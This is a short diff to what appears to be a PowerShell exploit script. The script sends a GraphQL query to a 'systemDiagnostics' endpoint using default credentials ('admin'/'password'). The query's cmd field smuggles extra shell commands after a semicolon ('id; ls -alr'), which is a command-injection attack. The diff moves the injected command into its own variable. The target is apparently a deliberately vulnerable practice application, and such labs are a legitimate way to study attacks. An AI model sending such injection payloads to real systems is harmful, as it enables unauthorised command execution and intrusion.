@@ -205,9 +205,11 @@ Write-Host -Object $result -ForegroundColor Magenta
 $userName = "admin"
 $password = "password"
 
+$commandToInject = "ls -alr"
+
 $commandInjectionQuery = '
     query {
-        systemDiagnostics(username:"' + $userName + '" password:"' + $password + '", cmd:"id; ls -l")
+        systemDiagnostics(username:"' + $userName + '" password:"' + $password + '", cmd:"id; ' + $commandToInject + '")
     }
 '
 
